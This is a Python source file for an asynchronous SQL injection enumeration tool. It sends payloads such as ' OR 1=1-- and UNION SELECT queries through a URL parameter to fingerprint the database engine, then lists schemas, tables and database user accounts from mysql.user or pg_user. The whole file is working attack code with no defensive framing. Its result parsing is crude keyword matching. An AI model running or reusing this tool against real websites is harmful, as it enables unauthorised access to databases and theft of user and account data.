import httpx
import logging
import time

class SQLIEnum:
    def __init__(self):
        self.enum_results = {}

    async def enumerate_database(self, target_url, param_name, payload):
        # Basic database enumeration for confirmed SQLi
        try:
            logging.info(f"Starting database enumeration for {target_url}")
            
            # Test for database type
            db_type = await self.detect_database_type(target_url, param_name)
            
            if db_type:
                self.enum_results['database_type'] = db_type
                
                # Enumerate databases
                databases = await self.enumerate_databases(target_url, param_name, db_type)
                self.enum_results['databases'] = databases
                
                # Enumerate tables (if database selected)
                if databases:
                    tables = await self.enumerate_tables(target_url, param_name, db_type, databases[0])
                    self.enum_results['tables'] = tables
                    
                    # Enumerate users
                    users = await self.enumerate_users(target_url, param_name, db_type)
                    self.enum_results['users'] = users
            
            return self.enum_results
            
        except Exception as e:
            logging.error(f"Database enumeration failed: {e}")
            return {}

    async def detect_database_type(self, target_url, param_name):
        # Detect database type using error messages
        db_tests = {
            'mysql': ["' OR 1=1--", "mysql_fetch", "mysql error"],
            'postgresql': ["' OR 1=1--", "postgresql error", "psql"],
            'sqlite': ["' OR 1=1--", "sqlite error", "sqlite3"],
            'oracle': ["' OR 1=1--", "ora-", "oracle error"],
            'mssql': ["' OR 1=1--", "microsoft sql", "sql server error"]
        }
        
        for db_type, test_payloads in db_tests.items():
            for payload in test_payloads:
                try:
                    async with httpx.AsyncClient(timeout=10) as client:
                        test_url = target_url.replace(f'{param_name}=test', f'{param_name}={payload}')
                        resp = await client.get(test_url)
                        
                        if any(indicator in resp.text.lower() for indicator in db_tests[db_type][1:]):
                            return db_type
                except Exception:
                    pass
        return None

    async def enumerate_databases(self, target_url, param_name, db_type):
        # Enumerate databases based on database type
        if db_type == 'mysql':
            payload = "' UNION SELECT schema_name FROM information_schema.schemata--"
        elif db_type == 'postgresql':
            payload = "' UNION SELECT datname FROM pg_database--"
        else:
            return []
        
        try:
            async with httpx.AsyncClient(timeout=10) as client:
                test_url = target_url.replace(f'{param_name}=test', f'{param_name}={payload}')
                resp = await client.get(test_url)
                
                # Parse database names from response
                # This is a simplified version - real implementation would need proper parsing
                databases = []
                if 'information_schema' in resp.text:
                    databases.append('information_schema')
                if 'mysql' in resp.text:
                    databases.append('mysql')
                if 'performance_schema' in resp.text:
                    databases.append('performance_schema')
                
                return databases
        except Exception:
            return []

    async def enumerate_tables(self, target_url, param_name, db_type, database):
        # Enumerate tables in the specified database
        if db_type == 'mysql':
            payload = f"' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='{database}'--"
        elif db_type == 'postgresql':
            payload = f"' UNION SELECT tablename FROM pg_tables WHERE schemaname='public'--"
        else:
            return []
        
        try:
            async with httpx.AsyncClient(timeout=10) as client:
                test_url = target_url.replace(f'{param_name}=test', f'{param_name}={payload}')
                resp = await client.get(test_url)
                
                # Parse table names from response
                tables = []
                common_tables = ['users', 'admin', 'user', 'accounts', 'login', 'auth']
                for table in common_tables:
                    if table in resp.text.lower():
                        tables.append(table)
                
                return tables
        except Exception:
            return []

    async def enumerate_users(self, target_url, param_name, db_type):
        # Enumerate database users
        if db_type == 'mysql':
            payload = "' UNION SELECT user FROM mysql.user--"
        elif db_type == 'postgresql':
            payload = "' UNION SELECT usename FROM pg_user--"
        else:
            return []
        
        try:
            async with httpx.AsyncClient(timeout=10) as client:
                test_url = target_url.replace(f'{param_name}=test', f'{param_name}={payload}')
                resp = await client.get(test_url)
                
                # Parse user names from response
                users = []
                common_users = ['root', 'admin', 'postgres', 'mysql']
                for user in common_users:
                    if user in resp.text.lower():
                        users.append(user)
                
                return users
        except Exception:
            return [] 